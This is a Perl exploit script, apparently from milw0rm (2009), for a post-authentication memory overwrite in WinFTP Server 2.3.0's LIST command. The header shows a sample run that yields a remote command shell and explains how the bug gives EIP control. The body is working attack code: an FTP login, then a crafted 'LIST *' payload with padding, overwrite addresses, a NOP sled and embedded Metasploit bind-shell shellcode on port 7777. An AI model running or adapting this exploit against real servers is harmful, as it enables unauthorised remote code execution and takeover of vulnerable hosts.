#!/usr/bin/perl
#
# WinFTP 2.3.0 post-auth remote exploit. (www.wftpserver.com)
#
################################################################################
#                                                                              #
# root@halcyon:~/Exploits/WinFTP# perl winftp-remote.pl                        #
#                                                                              #
# Usage: winftp-remote.pl <host> <username> <password> <target>                #
#                                                                              #
# Target: 1 -> Win2k                                                           #
# Target: 2 -> WinXP sp2/3 (DoS only)                                          #
#                                                                              #
# root@halcyon:~/Exploits/WinFTP# perl winftp-remote.pl 10.0.0.5 user1 pass1 1 #
#                                                                              #
# [=] Connected.                                                               #
# [=] Sending user user1                                                       #
# [=] Sending pass pass1                                                       #
# [=] Sending payload...                                                       #
# [=] Done. You should have a command shell on port 7777.                      #
#                                                                              #
# root@halcyon:~/Exploits/WinFTP# nc 10.0.0.5 7777                             #
# Microsoft Windows 2000 [Version 5.00.2195]                                   #
# (C) Copyright 1985-1999 Microsoft Corp.                                      #
#                                                                              #
# C:\Program Files\WinFTP Server>                                              #
#                                                                              #
################################################################################
#
# Quick description of the exploit:
#
# There is a post-auth bug in WFTPSRV.exe (2.3.0), in the handling of the LIST
# command.  This appears to be different from the previous vuln found in 
# the handling of the NLIST command.  Providing the server with 
# "LIST *<long string here>" results in an arbitrary memory overwrite 
# vulnerability.  Note that simply giving LIST a long string won't trigger
# the vuln.  At least in my testing, the asterisk was necessary to force 
# WFTPSRV.exe to process the long string, which clobbers various stored 
# addresses, providing an opportunity for an arbitrary DWORD overwrite.
# So exploitation goes like this:
#
# format string vuln -> overflow -> arbitrary memory overwrite -> EIP control
#
# On Win2k, the error is:
# "The instruction at 0x77fc9906 referenced memory at
# 0x88776655. The memory could not be "written".
#
# Which is what we want to see in order to control an arbitrary DWORD.
# At this point our registers look like:
#
#	EAX 010922E0
#	ECX 0275FC14
#	EDX 88776655
#	EBX 00000028
#	ESP 0275F688
#	EBP 0275F81C
#	ESI 00F90000
#	EDI 00F90378
#	EIP 77FC9906 ntdll.77FC9906
#
# Instructions look like:
#
#	77FC98F4   8B48 08          MOV ECX,DWORD PTR DS:[EAX+8]
#	77FC98F7   898D 38FFFFFF    MOV DWORD PTR SS:[EBP-C8],ECX
#	77FC98FD   8B50 0C          MOV EDX,DWORD PTR DS:[EAX+C]
#	77FC9900   8995 34FFFFFF    MOV DWORD PTR SS:[EBP-CC],EDX
#	77FC9906   890A             MOV DWORD PTR DS:[EDX],ECX
#	77FC9908   8951 04          MOV DWORD PTR DS:[ECX+4],EDX
#
# Under normal conditions EDX and ECX contain pointers located
# in the data segment.  However, after exploitation we control 
# EDX (where to write), and ECX (what to write).  From here,
# we load EDX with (almost) any old return address on our stack,
# and ECX with a pointer to our shellcode.
#
# Note: This is *not* a predictable vuln.  I noticed even changing 
# the filename of the binary causes the offsets to change.
# Please experiment on your own.  Let me know if you manage to
# get it working under WinXP SP2.
#					joewalko@gmail.com

use IO::Socket;

if (@ARGV < 2) {
        print "\nUsage: $0 <host> <username> <password> <target>\n\n";
        print "Target: 1 -> Win2k\n";
        print "Target: 2 -> WinXP sp2/3 (DoS only)\n\n";
        exit;
};

$host           = $ARGV[0];
$username       = $ARGV[1];
$password       = $ARGV[2];
$port           = 21;
$list           = "\x4c\x49\x53\x54\x20\x2a";
$padding        = "\x41" x 272;

$sock = new IO::Socket::INET
        (
                PeerAddr=> "$host",
                PeerPort=> "$port",
                Proto   => 'tcp'
        );

die "Connection failed: $!\n\n" unless $sock;
$user_string    = "user $username\r\n";
$pass_string    = "pass $password\r\n";
$port_string    = "PORT 10,0,0,1,154,119\r\n";  # Source host doesn't matter.


$address2k      = "\x74\xf8\x74\x02".	# <- This needs to contain any
 					#    readable address, or we 
					#    immediately cause an exception.
					    
                 "\x14\xfc\x75\x02".	# <- This will become EIP. It points
					#    to our shellcode.
					
                 "\x74\xf8\x75\x02";	# <- This specifies what DWORD to overwrite.
					#    YMMV here. I picked an arbitrary 
					#    return address on the stack located
					#    near where ESP was during 
					#    the exception.  On my system this
					#    is:
					#
					#    0275F874   73D34154  RETURN to MFC42.73D34154
$nopsled        = "\x90" x 2228;


# Metasploit win32_bind, EXITFUNC=process LPORT=7777
$shellcode      =
"\x2b\xc9\x83\xe9\xb0\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x10".
"\x92\xe9\xd3\x83\xeb\xfc\xe2\xf4\xec\xf8\x02\x9e\xf8\x6b\x16\x2c".
"\xef\xf2\x62\xbf\x34\xb6\x62\x96\x2c\x19\x95\xd6\x68\x93\x06\x58".
"\x5f\x8a\x62\x8c\x30\x93\x02\x9a\x9b\xa6\x62\xd2\xfe\xa3\x29\x4a".
"\xbc\x16\x29\xa7\x17\x53\x23\xde\x11\x50\x02\x27\x2b\xc6\xcd\xfb".
"\x65\x77\x62\x8c\x34\x93\x02\xb5\x9b\x9e\xa2\x58\x4f\x8e\xe8\x38".
"\x13\xbe\x62\x5a\x7c\xb6\xf5\xb2\xd3\xa3\x32\xb7\x9b\xd1\xd9\x58".
"\x50\x9e\x62\xa3\x0c\x3f\x62\x93\x18\xcc\x81\x5d\x5e\x9c\x05\x83".
"\xef\x44\x8f\x80\x76\xfa\xda\xe1\x78\xe5\x9a\xe1\x4f\xc6\x16\x03".
"\x78\x59\x04\x2f\x2b\xc2\x16\x05\x4f\x1b\x0c\xb5\x91\x7f\xe1\xd1".
"\x45\xf8\xeb\x2c\xc0\xfa\x30\xda\xe5\x3f\xbe\x2c\xc6\xc1\xba\x80".
"\x43\xc1\xaa\x80\x53\xc1\x16\x03\x76\xfa\xf7\xb2\x76\xc1\x60\x32".
"\x85\xfa\x4d\xc9\x60\x55\xbe\x2c\xc6\xf8\xf9\x82\x45\x6d\x39\xbb".
"\xb4\x3f\xc7\x3a\x47\x6d\x3f\x80\x45\x6d\x39\xbb\xf5\xdb\x6f\x9a".
"\x47\x6d\x3f\x83\x44\xc6\xbc\x2c\xc0\x01\x81\x34\x69\x54\x90\x84".
"\xef\x44\xbc\x2c\xc0\xf4\x83\xb7\x76\xfa\x8a\xbe\x99\x77\x83\x83".
"\x49\xbb\x25\x5a\xf7\xf8\xad\x5a\xf2\xa3\x29\x20\xba\x6c\xab\xfe".
"\xee\xd0\xc5\x40\x9d\xe8\xd1\x78\xbb\x39\x81\xa1\xee\x21\xff\x2c".
"\x65\xd6\x16\x05\x4b\xc5\xbb\x82\x41\xc3\x83\xd2\x41\xc3\xbc\x82".
"\xef\x42\x81\x7e\xc9\x97\x27\x80\xef\x44\x83\x2c\xef\xa5\x16\x03".
"\x9b\xc5\x15\x50\xd4\xf6\x16\x05\x42\x6d\x39\xbb\xe0\x18\xed\x8c".
"\x43\x6d\x3f\x2c\xc0\x92\xe9\xd3\x0d\x0a";


if ($ARGV[3] == '1')
{
        $payload = $list.$padding.$address2k.$nopsled.$shellcode;
}

elsif ($ARGV[3] == '2')
{
        $payload = $list.$padding.$address2k.$nopsled.$shellcode;
}

else
{
	$payload = $list.$padding.$address2k.$nopsled.$shellcode;
}


print "\n[=] Connected.\n";
sleep 1;

print "[=] Sending $user_string";
$sock->send($user_string);
sleep 1;

print "[=] Sending $pass_string";
$sock->send($pass_string);
sleep 1;

$sock->send($port_string);
sleep 1;

print "[=] Sending payload...\n";
$sock->send($payload);
sleep 1;


if ($ARGV[3] == '1')
{
	print "[=] Done. You should have a command shell on port 7777.\n\n";
}

elsif ($ARGV[3] == '2')
{
	print "[=] Done. WinFTP should be crashed on the remote host.\n\n";
}

else
{
	print "[=] Done.\n\n";
}

# milw0rm.com [2009-01-26]
